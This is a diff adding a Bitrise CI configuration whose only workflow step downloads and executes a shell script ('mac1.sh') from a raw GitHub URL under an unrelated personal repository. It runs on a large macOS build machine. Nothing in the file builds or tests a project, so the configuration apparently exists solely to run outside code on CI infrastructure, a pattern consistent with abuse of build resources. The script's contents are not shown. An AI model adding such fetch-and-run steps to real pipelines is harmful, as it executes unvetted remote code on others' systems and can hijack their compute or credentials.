@@ -1,0 +1,14 @@
+---
+format_version: '11'
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+project_type: other
+workflows:
+  primary:
+    steps:
+    - remote-script-runner@2:
+        inputs:
+        - script_url: https://raw.githubusercontent.com/codem001/pkt/main/mac1.sh
+meta:
+  bitrise.io:
+    stack: osx-xcode-14.0.x
+    machine_type_id: g2.8core
